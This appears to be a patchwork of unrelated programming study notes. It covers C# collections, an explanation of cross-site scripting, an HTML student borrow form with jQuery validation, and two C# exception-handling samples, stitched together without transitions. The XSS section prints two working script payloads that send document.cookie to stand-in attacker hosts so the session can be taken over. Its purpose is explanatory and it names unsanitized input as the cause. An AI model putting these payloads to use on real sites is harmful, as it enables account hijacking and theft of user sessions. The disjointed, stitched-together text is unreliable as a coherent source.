Why Use Collections & Generics in C#?
1️⃣ Collections (Efficient Data Management)
✅ Store multiple values dynamically (Unlike arrays, which are fixed-size)
✅ Pre-built operations → Add, Remove, Search, Sort, etc.
✅ Different types available:

List<T> → Ordered, resizable
Dictionary<TKey, TValue> → Key-Value pairs
Queue<T> & Stack<T> → FIFO & LIFO structures
Example: List<T> (Better than Arrays)

List<int> numbers = new List<int> { 1, 2, 3 };
numbers.Add(4);
Console.WriteLine(numbers.Count);  // Output: 4

// Real-World Impact
In a more sophisticated case, HackerX could craft a script like this:
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http://hackerx-evil-site.com/steal", true);
  xhr.send(document.cookie);
</script>
If this runs on Jane's browser, HackerX could hijack her account 
by stealing her authentication cookies, 
potentially posting on her behalf or accessing private messages.
Why It Worked
Vulnerability: ConnectSphere didn’t sanitize user input, allowing 
<script> tags to be rendered as code instead of plain text.


// Real-World Case of XSS Attack
Stealing Cookies (Cookie Theft): 
An attacker could modify the XSS payload to steal cookies or session tokens.

For example:
<script>
  var img = new Image();
  img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>

The attacker can use a JavaScript payload that collects the user's cookies (document.cookie) 
and sends it to a remote server controlled by the attacker. This allows the attacker to 
impersonate the user by using the stolen session cookie.


<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Library Management System - Student Form</title>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <style>
       body { font-family: Arial, sans-serif; }
       .error { color: red; font-size: 12px; }
       .form-container { max-width: 400px; margin: 0 auto; }
       label, input { display: block; margin: 8px 0; }
       input[type="submit"] { background-color: #4CAF50; color: white; border: none; padding: 10px 20px; cursor: pointer; }
       input[type="submit"]:hover { background-color: #45a049; }
   </style>
</head>
<body>

<div class="form-container">
   <h2>Student Borrow Form</h2>
   <form id="studentForm">
       <label for="studentName">Student Name:</label>
       <input type="text" id="studentName" name="studentName" required>
       <div id="nameError" class="error"></div>


       <label for="rollNumber">Roll Number:</label>
       <input type="text" id="rollNumber" name="rollNumber" required>
       <div id="rollError" class="error"></div>


       <label for="bookName">Book Name:</label>
       <input type="text" id="bookName" name="bookName" required>
       <div id="bookError" class="error"></div>

       <input type="submit" value="Submit">
   </form>
</div>
<script>
   $(document).ready(function () {
       $('#studentForm').submit(function (event) {
           event.preventDefault(); // Prevent form submission

           // Reset error messages
           $('.error').text('');

           // Get input values
           var studentName = $('#studentName').val();
           var rollNumber = $('#rollNumber').val();
           var bookName = $('#bookName').val();

           var valid = true;

           // Validate student name (must not be empty)
           if (studentName.trim() === '') {
               $('#nameError').text('Student name is required.');
               valid = false;
           }

           // Validate roll number (must be numeric)
           if (rollNumber.trim() === '') {
               $('#rollError').text('Roll number is required.');
               valid = false;
           } else if (!/^\d+$/.test(rollNumber)) {
               $('#rollError').text('Roll number must be numeric.');
               valid = false;
           }

           // Validate book name (must not be empty)
           if (bookName.trim() === '') {
               $('#bookError').text('Book name is required.');
               valid = false;
           }

           // If all validations pass, display success message
           if (valid) {
               alert('Form submitted successfully!');
               // You can add logic here to submit the form data to a server, e.g., using AJAX.
           }
       });
   });
</script>
</body>
</html>





using System;

class InsufficientFundsException : Exception 
{
    public InsufficientFundsException(string message) : base(message) { }
}

class Program
{
    static void Main()
    {
        double balance = 500, withdrawAmount = 700;

        try
        {
            if (withdrawAmount > balance)
                throw new InsufficientFundsException("Insufficient funds!");

            balance -= withdrawAmount;
            Console.WriteLine($"Remaining Balance: {balance:C}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }
}

using System;

class Program
{
    static void Main()
    {
        try
        {
            throw new Exception("This is an error!");  // Throws error
        }
        catch (Exception e)
        {
            Console.WriteLine("Caught error: " + e.Message);  // Handles error
        }
    }
}
